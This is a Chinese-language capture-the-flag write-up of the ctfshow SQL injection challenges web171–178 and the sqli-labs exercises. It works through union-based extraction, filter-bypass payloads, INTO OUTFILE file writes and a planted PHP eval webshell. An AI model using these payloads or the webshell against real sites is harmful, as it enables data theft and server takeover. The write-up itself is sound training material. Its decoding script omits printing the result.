# SQL注入（WP）

## web171

![](C:\Users\zzzjj\Pictures\Screenshots\屏幕截图 2025-12-23 203945.png)

1分析sql语句

~~~sql
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
~~~

查询条件是：

- `username != 'flag'` （用户名不等于 "flag"）
- `id = '".$_GET['id']."'` （id 等于来自 HTTP GET 请求的参数 `id`）（使用单引号将用户输入包裹起来，属于字符型注入）

`limit 1` 表示只返回一条记录。

我们可以通过  1 and 1=1（不报错）和1 and 1=2（报错）———数字型

​						1’ and ‘1’ =’1（不报错）和1’ and ‘1’=’2（报错）———字符型

输入1’ or 1=1- -+

~~~sql
select username,password from user where username !='flag' and id = '1' OR 1=1 --+ limit 1;
~~~

1. **注释符 --**

-- 是 SQL 中的单行注释符号，后面内容会被忽略（直到换行符）。(+为空格)

1. **SQL 执行时，注释后面内容被忽略**

因此，`--+` 之后的内容（包括后面的 **' limit 1;**）会被当注释忽略掉。

根据 SQL 的运算优先级，AND 的优先级高于 OR，所以等价于：

~~~sql
where (username != 'flag' and id = '1') OR (1=1)
~~~

1=1 永远为真，所以 WHERE 条件恒为真，等同于查询所有数据。**换句话说，条件变成永远成立，不限制 id = 1，绕过了限制。**

![](C:\Users\zzzjj\Pictures\Screenshots\屏幕截图 2025-12-23 204001.png)

第二种方法

999’ or id=’26  数据库中无id=999的数据，所以返回id=26的数据，从而得到flag

## web172

打开无过滤2 再次输入万能钥匙 同样没有flag 判断一下注入类型 通过1’ and ‘1’ =’1（不报错）和1’ and ‘1’=’2（报错） 判断出为字符型

接下来判断数据库的字段 1’ order by 5–+ 无数据（说明数据库小于四列）1’ order by 4–+ 无数据       1’ order by 3–+ 无数据

1’ order by 2–+ 有数据（说明该数据库有两列）

通过-1’ union select 1,2 –+  从而得到回显位（第一列显示在用户名后面，第二列显示在密码后面）（-1的作用：让原sql查询一定返回空结果，从而为union select 注入腾出位置）

![](C:\Users\zzzjj\Pictures\Screenshots\屏幕截图 2025-12-25 104200.png)

列数匹配（原查询是2列 union select必须也是2列）

查询数据库 -1' union select 1,database() --+

![](C:\Users\zzzjj\Pictures\Screenshots\屏幕截图 2025-12-25 104726.png)

获取数据库ctfshowweb的所有表名 -1' union select 1,table_name from information_schema.tables where table_schema='ctfshow_web' --+

![](C:\Users\zzzjj\Pictures\Screenshots\屏幕截图 2025-12-25 105649.png)

payload  -1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web' --+

![image-20251225110125510](C:\Users\zzzjj\AppData\Roaming\Typora\typora-user-images\image-20251225110125510.png)

同样可以获取所有表名 并且在一行

`GROUP_CONCAT` 是 MySQL 中的一个聚合函数，用于将**分组后的多行值连接成一个字符串**，各个值之间用指定的分隔符分隔（默认是逗号`,`）。

- 将多行结果中的某一列值合并成一个字符串返回。

- 方便把多条记录的某字段“汇总”成一条字符串。

  查询列名   -1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' --+

  ![image-20251225111114748](C:\Users\zzzjj\AppData\Roaming\Typora\typora-user-images\image-20251225111114748.png)

  使用-1' union select 1,column_name from information_schema.columns where table_schema='ctfshow_web' and table_name=‘ctfshow_user’--+可以单独查询一张表的列名

  通过查询每个表 -1' union select 1,group_concat(username,password) from ctfshow_user2 where username ='flag'--+

  ![image-20251225113214171](C:\Users\zzzjj\AppData\Roaming\Typora\typora-user-images\image-20251225113214171.png)

~~~php
//检查结果是否有flag
    if($row->username!=='flag'){
      $ret['msg']='查询成功';
    }
~~~

#### 为什么可以绕过检查

- **`union` 合并了两条结果集**
  第一条：`username != 'flag' and id = '-1'`，一般无结果（id=-1通常不存在）。

  第二条：`select 1, group_concat(username,password) from ... where username='flag'`，返回一条结果：

  - 第一列是数字 `1`
  - 第二列是 `group_concat` 拼接的字符串，比如 `"flagpassword123"`（username 和 password 拼在一起）

- **PHP接收的结果是 `$row`，通常是查询结果的第一行**。

- 由于`union select`返回的第一列是 `1`，第二列是拼接字符串，且 `username` 被赋值为第一列，`password` 是第二列。

- 你代码中判断的是 `$row->username !== 'flag'`，此时 `$row->username` 是 `1`（数字或字符串形式），**不等于 `'flag'`**，条件成立。

#### information——schema

- **存储数据库结构信息**
  它包含了所有数据库的表、列、索引、权限、字符集等各种“描述信息”，比如：
  - 有哪些数据库（schemas）
  - 每个数据库中有哪些表（tables）
  - 表中的字段（columns）
  - 索引信息、约束信息等
- **攻击者用它来探测数据库结构**
  当攻击者通过 SQL 注入获得数据库访问权限时，往往不知道目标数据库的结构。
  利用 `information_schema`，攻击者可以：
  - 查询当前服务器上有哪些数据库
  - 查询某个数据库中有哪些表
  - 查询表中有哪些字段及其类型
- **提供了统一的查询接口**
  不同数据库厂商都实现了自己的 `information_schema`，接口和表大体相同，方便查询。

## web173

~~~sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user3 where username !='flag' and id = '".$_GET['id']."' limit 1;";
      
~~~

前几步都与web172相同 判断出该数据库有三个表

~~~php
//检查结果是否有flag
    if(!preg_match('/flag/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
~~~

由于以上  继续使用172的解法 无法得到flag

原因：

 使用了  group_concat(username, password) ，这意味着查询结果中一定包含字符串  flag （因为  username  的值就是  flag ）。

后端反应： 数据库虽然查出来了，但在返回给浏览器之前，PHP 代码  preg_match('/flag/i', ...)  检测到了结果里有  flag 。

结果： 后端程序“吓得”不敢返回数据（或者返回错误），导致你看到的是空的或者报错的页面。

所以选择查询password 从而间接查询username

payload：-1' union select 1,2,password from ctfshow_user3 where username='flag' -- +

还可以将flag编码 使其绕过检测

payload：-1' union select 1,password,hex(username) from ctfshow_user3 where username='flag' -- +

![image-20251225122636926](C:\Users\zzzjj\AppData\Roaming\Typora\typora-user-images\image-20251225122636926.png)

## web174

~~~php
//检查结果是否有flag
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
~~~

#### 结构拆解

- 斜杠 `/.../`：这是正则表达式的定界符，表示正则表达式的开始和结束。
- `flag|[0-9]`：这是正则表达式的主体部分。
- `i`：这是修饰符，表示 **忽略大小写匹配**（不区分大小写）。

------

#### 正则主体分析

1. `flag`
   - 匹配字符串 `"flag"`，不区分大小写，因此 `flag`、`Flag`、`FLAG` 等都能匹配。
2. `|`
   - 逻辑“或”操作符，表示匹配左边的 `flag` **或者** 右边的 `[0-9]`。
3. `[0-9]`
   - 字符集，匹配任意单个数字字符 0 到 9。

#### 综合理解

这个正则表达式的意思是：

> **如果 `$ret` 编码成 JSON 后的字符串中既不包含 “flag” 这个单词，也不包含任何数字字符，那么条件成立（返回真）。**

**为什么输入-1’ union select 1,2 –+无法查到数据**

| 问题                          | 原因                                                  |
| ----------------------------- | ----------------------------------------------------- |
| `union select 1,2` 无回显     | 返回值含数字，被后端 `preg_match('/[0-9]/')` 过滤掉了 |
| `union select 'a','b'` 有回显 | 字符串不含数字/flag，通过检查，正常显示               |

- 理解“无回显” ≠ “SQL 没执行”，而是结果被业务逻辑过滤”

过滤了flag与数字，将数字替换成字母，使结果不出现数字，从而绕过正则检测

```sql
REPLACE(original_string, from_substring, to_substring)
```

- `original_string`：要进行替换操作的原始字符串。
- `from_substring`：要被替换掉的子字符串。
- `to_substring`：用来替换的新字符串。

**查询数据库的表名**

~~~sql
-1' union select 'a' ,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(table_name,'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J'),'g','j') from information_schema.tables where table_schema=database()--+
~~~

![image-20260122213201434](C:\Users\zzzjj\AppData\Roaming\Typora\typora-user-images\image-20260122213201434.png)

得到数据库表名为ctfshow_user4

**查找flag**

~~~sql
-1'union select'dummy',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'0','J'),'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I')from ctfshow_user4 where username='flag' -- -
~~~

![](C:\Users\zzzjj\Pictures\Screenshots\屏幕截图 2026-01-23 205039.png)

~~~
ctfshow{aIFCafaH-GEAG-DEFf-HAIc-BFaeFefcfaBA}
~~~

根据替换规律,使用python写个小脚本

~~~python
encoded = input("请输入你拿到的混淆 flag（例如 ctfshow{DAIB...}）: ").strip()

# 替换映射：字母 → 数字
mapping = {
    'J': '0',
    'A': '1',
    'B': '2',
    'C': '3',
    'D': '4',
    'E': '5',
    'F': '6',
    'G': '7',
    'H': '8',
    'I': '9'
}

decoded = encoded
for letter, digit in mapping.items():
    decoded = decoded.replace(letter, digit)

print("\n 还原后的 flag 是：")
~~~

得到原始的flag

~~~
ctfshow{a963afa8-7517-456f-819c-26ae6efcfa21}
~~~



## web175

~~~sql
//检查结果是否有flag
    if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
~~~

这个正则表达式 `[\x00-\x7f]` 匹配的是 **ASCII 字符集中的所有字符**（从 0x00 到 0x7F）。

#### 详细解释：

- **`[...]`** - 字符集（字符类），匹配方括号内列出的任意一个字符
- **`\x00`** - 十六进制表示的 ASCII 码 0（空字符 NUL）
- **`\x7f`** - 十六进制表示的 ASCII 码 127（删除控制符 DEL）
- **`-`** - 表示范围，从 `\x00` 到 `\x7f` 的连续范围

#### 匹配范围包括：

**控制字符（0x00-0x1F）：**

- NUL (空字符)、SOH、STX 等控制字符
- TAB (制表符)、LF (换行)、CR (回车) 等

**可见字符（0x20-0x7E）：**

- 空格 (0x20)
- 数字 0-9 (0x30-0x39)
- 大写字母 A-Z (0x41-0x5A)
- 小写字母 a-z (0x61-0x7A)
- 标点符号 !"#$%&'()*+,-./:;<=>?@[]^_`{|}~

**最后一个控制字符（0x7F）：**

- DEL (删除控制符)

如果使用常规的联合注入（union select）去查询flag，查询结果必然·包含ASCII字符，preg_match就会匹配成功，程序就不会返回查询结果。既然无法通过回显获取数据，那么就可以使用文件操作，将SQL查询的结果直接写入的数据库服务器的文件系统中。

~~~sql
1' union select 1,password from ctfshow_user5 where username='flag' into outfile '/var/www/html/ctf.txt'--A
~~~

访问[c16f3fb3-10b4-435a-832d-f5adab86452e.challenge.ctf.show/ctf.txt](https://c16f3fb3-10b4-435a-832d-f5adab86452e.challenge.ctf.show/ctf.txt) 得到flag

![](C:\Users\zzzjj\Pictures\Screenshots\屏幕截图 2026-03-11 134640.png)

#### 可能遇到的问题

文件已存在，原因：into outfile有一个严格的规则 目标文件必须不存在。如果之前写入过ctf.txt，MYSQL就会报错File'xxx‘ already exists

### 法二

利用into outfile 将一个php一句话木马写入服务器

1.构造payload：-1' union select 1, "<?php eval($_POST[1]);?>" into outfile '/var/www/html/1.php' --+  联合查询，将第二个字段设置为一句话木马

2.使用工具连接（蚁剑）

![](C:\Users\zzzjj\Pictures\Screenshots\屏幕截图 2026-03-11 140610.png)

![](C:\Users\zzzjj\Pictures\Screenshots\屏幕截图 2026-03-11 140623.png)

成功得到flag

## web176

#### 法一

按照正常的套路进行一些基础查询，使用order by 得到该数据库有三列，但当使用select进行回显位查询时，却没有返回任何数据，根据

题,可知该题可能是对select进行了过滤，尝试将select大写绕过过滤，在进行后续操作

~~~
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
~~~

~~~
-1’ union SELECT 1，username，password from ctfshow_user where username='flag' --+
~~~

#### 法二

因为本题没有正则匹配，可以直接通过or逻辑让查询条件成立(注意引号闭合方式)

~~~
-1' or username='flag
~~~

## web177

![](C:\Users\zzzjj\Pictures\Screenshots\屏幕截图 2026-03-31 221708.png)

![](C:\Users\zzzjj\Pictures\Screenshots\屏幕截图 2026-03-31 221717.png)

通过输入空格和不输入空格

这道题的核心考点是 SQL 注入中的空格和–+的过滤绕过。

首先，我们需要了解题目的后端代码逻辑。关键的 SQL 查询语句如下：

~~~sql
// 拼接 sql 语句查找指定 ID 用户
sql = "select id,username,password from ctfshow_user where username !='flag' and id = '"._GET['id']."' limit 1;";
~~~

关键信息提取：
*   注入点：id 参数，且是字符型注入（因为代码中拼接了单引号 '）。
*   查询表：ctfshow_user。
*   过滤条件：username != 'flag'（意味着直接查 flag 用户会被过滤，但联合查询通常可以绕过这个限制）。
*   过滤规则：题目过滤了空格。如果你输入 UNION SELECT，中间的空格会被拦截或导致 SQL 语法错误。

2. 绕过空格过滤

在 MySQL 中，除了普通的空格（%20），还有很多字符可以被解析为“空白”，从而分隔关键字。

常用的绕过方法：
*   %0b：垂直制表符（Vertical Tab），在 MySQL 中常被用作空格替代。
*   /**/：内联注释，数据库会将其视为空白。
*   %0a：换行符。
*   %0c：换页符。
*   %0d：回车符。

3. 解题步骤

第一步：判断字段数
我们需要知道查询结果有几列，以便构造 UNION SELECT 语句。
尝试输入：
1' order by 3%23
1' order by 4%23

*   如果 order by 3 正常，order by 4 报错，说明有 3 列。
*   注意：由于过滤了空格，order by 中间必须用 %0b 或 // 连接，例如 1'//order//by//3     %23order%0bby 

第二步：确定回显位
我们需要知道哪一列的数据会显示在网页上。
构造 Payload（使用 -1 是为了让前面的查询结果为空，从而只显示后面联合查询的结果）：
-1' union select 1,2,3%23

第三步：爆数据（获取 Flag）
根据题目提示，flag 在 ctfshow_user 表中，且 username 为 flag。
我们需要查询该用户的 password 字段。

绕过空格的最终 Payload（使用 %0b）：
~~~sql
-1' union/**/select 1,2,(select/**/password/**/from/**/ctfshow_user/**/where/**/username='flag')%23
~~~



技巧说明：
*   反引号   ：在 MySQL 中，表名和字段名可以用反引号包裹（如  password ）。这不仅能代替空格（在某些情况下），还能防止关键字冲突。
*   括号 ()：子查询 (select ...) 本身就可以作为一列数据，且括号前后不需要空格。

总结
关键在于用 %0b 或 //` 代替空格，并利用子查询或反引号``来构造标准的 SQL 注入语句获取 flag。

| 编码 | 字符描述         | 示例 Payload                |
| ---- | ---------------- | --------------------------- |
| %09  | 水平制表符 (TAB) | UNION%09SELECT              |
| %0a  | 换行符 (LF)      | UNION%0aSELECT              |
| %0b  | 垂直制表符       | UNION%0bSELECT (MySQL 常用) |
| %0c  | 换页符           | UNION%0cSELECT              |
| %0d  | 回车符 (CR)      | UNION%0dSELECT              |
| %a0  | 不间断空格       | UNION%a0SELECT              |

## web178

括号可以包裹函数名，子查询或表达式，从而不需要空格就能分割关键字

# sqli-lab

## less-1

输入id=1可以正常查询到数据，接下来可以判断注入类型，当输入1 and 1=1和1 and 1=2时，查到的数据都是id=1时的数据（数据库会从字符串的开头读取数字，直到遇到非数字字符为止，所以这两种都被强制转换成数字1）

判断引号闭合方式，输入id=1’和id=1”

![image-20260407224032985](C:\Users\zzzjj\AppData\Roaming\Typora\typora-user-images\image-20260407224032985.png)

![](C:\Users\zzzjj\Pictures\Screenshots\屏幕截图 2026-04-07 224015.png)

根据结果两种结果不同，可以判断出闭合方式为单引号，为后续构造payload做准备，跟上面的一样，得到字段数和回显位，开始获取数据库内容

![image-20260407225033522](C:\Users\zzzjj\AppData\Roaming\Typora\typora-user-images\image-20260407225033522.png)

![image-20260407225242285](C:\Users\zzzjj\AppData\Roaming\Typora\typora-user-images\image-20260407225242285.png)

获取列名和表名，进而查到更多数据

![image-20260407225715233](C:\Users\zzzjj\AppData\Roaming\Typora\typora-user-images\image-20260407225715233.png)

## less-2

当输入1 and 1=1显示id=1的数据，而1 and 1=2时页面直接没有反应，说明是数字型注入，后续操作与less-1差不多，只是无需引号闭合

